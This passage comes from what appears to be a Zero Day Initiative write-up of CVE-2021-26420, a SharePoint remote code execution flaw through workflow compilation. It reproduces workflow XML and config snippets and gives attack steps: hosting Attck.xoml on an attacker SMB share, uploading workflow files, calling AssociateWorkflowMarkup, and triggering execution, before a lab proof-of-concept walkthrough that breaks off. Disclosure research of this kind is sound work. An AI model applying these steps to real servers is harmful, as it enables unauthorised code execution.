          <td id="file-cve-2021-26420-snippet-5-xml-L42" class="blob-num js-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC42" class="blob-code blob-code-inner js-file-line">            &lt;/<span class="pl-ent">RuleExpressionCondition</span>.Expression&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L43" class="blob-num js-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC43" class="blob-code blob-code-inner js-file-line">        &lt;/<span class="pl-ent">RuleExpressionCondition</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L44" class="blob-num js-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC44" class="blob-code blob-code-inner js-file-line">    &lt;/<span class="pl-ent">RuleDefinitions</span>.Conditions&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L45" class="blob-num js-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC45" class="blob-code blob-code-inner js-file-line">&lt;/<span class="pl-ent">RuleDefinitions</span>&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/4e5ba12636f88c141bdc5ef2d7c1ca15/raw/950137bd29f9f6f484d92ac4e5ffe63a0e5b5716/CVE-2021-26420-snippet-5.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/4e5ba12636f88c141bdc5ef2d7c1ca15#file-cve-2021-26420-snippet-5-xml" class="Link--inTextBlock">
          CVE-2021-26420-snippet-5.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1632752463728_62287"><div class="sqs-block-content"><p>This rule will be triggered by the following lines from the XOML file of our SharePoint workflow (<code>WF02.xoml</code>):</p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/8f351ecbf19ae4bde001ca88384df275.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1632752463728_63152"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_83" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/8f351ecbf19ae4bde001ca88384df275.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/gist-embed-0ac919313390.css"><div id="gist112201110" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-26420-snippet-6-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-26420-snippet-6.xml content, created by zdi-team on 02:24PM on October 05, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-26420-snippet-6.xml">
        <tbody><tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">SequenceActivity</span> <span class="pl-e">x</span><span class="pl-e">:</span><span class="pl-e">Name</span>=<span class="pl-s"><span class="pl-pds">"</span>ID3<span class="pl-pds">"</span></span> <span class="pl-e">Description</span>=<span class="pl-s"><span class="pl-pds">"</span>Step 1<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC2" class="blob-code blob-code-inner js-file-line">        &lt;<span class="pl-ent">IfElseActivity</span> <span class="pl-e">x</span><span class="pl-e">:</span><span class="pl-e">Name</span>=<span class="pl-s"><span class="pl-pds">"</span>ID10454<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC3" class="blob-code blob-code-inner js-file-line">            &lt;<span class="pl-ent">IfElseBranchActivity</span> <span class="pl-e">x</span><span class="pl-e">:</span><span class="pl-e">Name</span>=<span class="pl-s"><span class="pl-pds">"</span>ID10455<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC4" class="blob-code blob-code-inner js-file-line">                &lt;<span class="pl-ent">IfElseBranchActivity</span>.Condition&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC5" class="blob-code blob-code-inner js-file-line">                    &lt;<span class="pl-ent">RuleConditionReference</span> <span class="pl-e">ConditionName</span>=<span class="pl-s"><span class="pl-pds">"</span>__Rule_ID3<span class="pl-pds">"</span></span> /&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC6" class="blob-code blob-code-inner js-file-line">                &lt;/<span class="pl-ent">IfElseBranchActivity</span>.Condition&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC7" class="blob-code blob-code-inner js-file-line">                &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">ClearArrayListActivity</span> <span class="pl-e">x</span><span class="pl-e">:</span><span class="pl-e">Name</span>=<span class="pl-s"><span class="pl-pds">"</span>ID10457<span class="pl-pds">"</span></span> <span class="pl-e">ReturnValue</span>=<span class="pl-s"><span class="pl-pds">"</span>{x:Null}<span class="pl-pds">"</span></span> /&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC8" class="blob-code blob-code-inner js-file-line">            &lt;/<span class="pl-ent">IfElseBranchActivity</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC9" class="blob-code blob-code-inner js-file-line">        &lt;/<span class="pl-ent">IfElseActivity</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-6-xml-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2021-26420-snippet-6-xml-LC10" class="blob-code blob-code-inner js-file-line">    &lt;/<span class="pl-ent">SequenceActivity</span>&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/8f351ecbf19ae4bde001ca88384df275/raw/5e18be1125127bba99c054351f21cd9882833fbe/CVE-2021-26420-snippet-6.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/8f351ecbf19ae4bde001ca88384df275#file-cve-2021-26420-snippet-6-xml" class="Link--inTextBlock">
          CVE-2021-26420-snippet-6.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1632752463728_63771"><div class="sqs-block-content"><p>An attacker could store <code>Attck.xoml</code> in a shared SMB folder controlled by the attacker and upload the <code>WF02.xoml</code> and <code>WF02.rules</code> files to a location on the SharePoint site, for example, to the <b data-preserve-html-node="true"><i data-preserve-html-node="true">Documents</i></b> folder.  Also, the attacker would need a workflow configuration file (<code>WF02config.xml</code>) that points to the uploaded XOML and rules files, and associates them with the <b data-preserve-html-node="true"><i data-preserve-html-node="true">ListID</i></b> of a list in the site where the attacker can add new items: </p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/3fd2acfda991c537df4338b155f1bdb1.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1632752463728_65566"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_86" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/3fd2acfda991c537df4338b155f1bdb1.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/gist-embed-0ac919313390.css"><div id="gist112201114" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-26420-snippet-7-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-26420-snippet-7.xml content, created by zdi-team on 02:24PM on October 05, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-26420-snippet-7.xml">
        <tbody><tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">WorkflowConfig</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC2" class="blob-code blob-code-inner js-file-line">    &lt;<span class="pl-ent">Template</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC3" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">BaseID</span>=<span class="pl-s"><span class="pl-pds">"</span>{e5d3f29d-40e6-5283-8d1b-d44c90c413c7}<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC4" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">DocLibURL</span>=<span class="pl-s"><span class="pl-pds">"</span>Documents<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC5" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">XomlHref</span>=<span class="pl-s"><span class="pl-pds">"</span>Shared Documents/WF02.xoml<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC6" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">RulesHref</span>=<span class="pl-s"><span class="pl-pds">"</span>Shared Documents/WF02.rules<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC7" class="blob-code blob-code-inner js-file-line">      &gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC8" class="blob-code blob-code-inner js-file-line">    &lt;/<span class="pl-ent">Template</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC9" class="blob-code blob-code-inner js-file-line">    &lt;<span class="pl-ent">Association</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC10" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">ListID</span>=<span class="pl-s"><span class="pl-pds">"</span>{e1d3f19d-40e6-4280-8d0b-c44c90e413c7}<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC11" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">StartOnCreate</span>=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC12" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">StartManually</span>=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-e">StartOnChange</span>=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span>    &gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC14" class="blob-code blob-code-inner js-file-line">    &lt;/<span class="pl-ent">Association</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC15" class="blob-code blob-code-inner js-file-line">    &lt;<span class="pl-ent">ContentTypes</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC16" class="blob-code blob-code-inner js-file-line">    &lt;/<span class="pl-ent">ContentTypes</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-7-xml-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cve-2021-26420-snippet-7-xml-LC17" class="blob-code blob-code-inner js-file-line">&lt;/<span class="pl-ent">WorkflowConfig</span>&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/3fd2acfda991c537df4338b155f1bdb1/raw/7d8b5615655f95e60e4a8844d00772fd6b45a6d7/CVE-2021-26420-snippet-7.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/3fd2acfda991c537df4338b155f1bdb1#file-cve-2021-26420-snippet-7-xml" class="Link--inTextBlock">
          CVE-2021-26420-snippet-7.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_66206"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">An attacker would need to associate this new workflow with the SharePoint list. This can be done by using the <strong><em>AssociateWorkflowMarkup</em></strong> method from the <strong><em>WebPartPages</em></strong> WebService (<strong>/_vti_bin/WebPartPages.asmx) </strong>and providing the relative path to the uploaded config file.</p><p class="" style="white-space:pre-wrap;">To trigger workflow execution, the attacker adds a new item to the target SharePoint list. <strong>&nbsp;</strong></p><p class="" style="white-space:pre-wrap;"><strong>Proof of Concept</strong></p>
</div>






















</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1632752463728_81395"><div class="sqs-block-content"><p>For this demonstration, we use Microsoft SharePoint Server 2019 installed with all default options on Windows Server 2019 Datacenter. The server’s computer name is <code>sp2019.contoso.lab</code> and it is a member of the <code>contoso.lab</code> domain. The domain controller is a separate virtual machine. It has been updated to the February 2021 patch level (version 16.0.10371.20043) and a couple of users have been added, including “user2” as a regular, unprivileged user.  </p>
<p>On the attacker side, we need:<br> --    an SMB server hosting the Attck.xoml file containing the .NET code we want to execute. It must be hosted on a share that can be accessed by the SharePoint server<br> --    our PoC application for sending SOAP requests to the server (SP_soap_RCE_PoC.exe) that calls the <b data-preserve-html-node="true"><i data-preserve-html-node="true">AssociateWorkflowMarkup</i></b> method of the <b data-preserve-html-node="true"><i data-preserve-html-node="true">WebPartPages</i></b> web service<br> --    the workflow config file, <code>WF02config.xml</code><br> --    The XOML and <code>.rules</code> files referenced by the workflow config file<br> --    any supported web browser. For this demonstration, we are using Firefox.  </p>
<p><b data-preserve-html-node="true">Achieving Remote Code Execution</b>   </p>
<p>Let’s visit our SharePoint Server and authenticate as a regular user. In my case it is <b data-preserve-html-node="true"><i data-preserve-html-node="true">user2</i></b>:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_85851"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_93">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_92">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_91">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_90">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_89">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:37.82051086425781%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_88">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png" data-image-dimensions="936x354" data-image-focal-point="0.5,0.5" alt="Picture2.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture2.png" width="936" height="354" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462745098-9AMJK7YGB2033R5XHSO9/Picture2.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_87355"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Before our attack, we need to prepare a few things. We could try to do this with current user sites, but if possible, we recommend creating a new site so that we will be the owner and have all permissions. </p><p class="" style="white-space:pre-wrap;">Click on “<strong>SharePoint</strong>” on the top panel:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_93477"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_118">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_117">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_116">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_115">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_114">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:42.94871520996094%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_113">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png" data-image-dimensions="936x402" data-image-focal-point="0.5,0.5" alt="Picture3.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture3.png" width="936" height="402" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462796382-DGBEQENQ2SCII58FCQV8/Picture3.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_94841"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Now click the “<strong><em>+ Create site</em></strong>” link:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_95310"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_134">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_133">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_132">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_131">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_130">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:52.136756896972656%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_129">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png" data-image-dimensions="936x488" data-image-focal-point="0.5,0.5" alt="Picture4.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture4.png" width="936" height="488" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462826535-XXYZY1IU6KJOFC38QJMC/Picture4.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_115932"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Choose <strong><em>Team Site</em></strong>.</p><p class="" style="white-space:pre-wrap;">Pick a name for the new site. Here we use <strong>testsiteofuser2</strong>. </p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_116596"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_150">










































  

    
  
